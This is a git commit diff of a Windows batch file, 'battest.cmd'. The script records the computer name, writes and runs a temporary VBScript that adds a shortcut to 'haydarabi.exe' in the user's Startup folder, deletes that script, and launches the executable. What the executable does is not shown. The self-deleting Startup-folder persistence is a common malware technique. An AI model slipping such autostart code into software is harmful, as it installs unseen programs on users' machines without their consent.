606b63f85a9694999b56b420fe463d3c9cc150d8
Feristah016 <97804458+Feristah016@users.noreply.github.com>
2022-03-19 17:47:31 +0300

    Update battest.cmd

--- battest.cmd
+++ battest.cmd
@@ -1,13 +1,11 @@
-color a
-echo %computername%/>C:\Users\'%USERNAME%'\"3D Objects"\dist\acilis.txt
+@echo off
+echo %computername%/>acilis.txt
 echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
 echo sLinkFile = "%HOMEDRIVE%%HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\haydarabi.lnk" >> CreateShortcut.vbs
 echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
 set mypath=%cd%
-echo %HOMEDRIVE%%HOMEPATH%
-echo oLink.TargetPath = "%HOMEDRIVE%%HOMEPATH%\'3D Objects'\dist\haydarabi.exe" >> CreateShortcut.vbs
+echo oLink.TargetPath = "%mypath%\haydarabi.exe" >> CreateShortcut.vbs
 echo oLink.Save >> CreateShortcut.vbs
 cscript CreateShortcut.vbs
 del CreateShortcut.vbs
-start C:\Users\"%USERNAME%"\"3D Objects"\dist\haydarabi.exe
-exit 0
+start haydarabi.exe
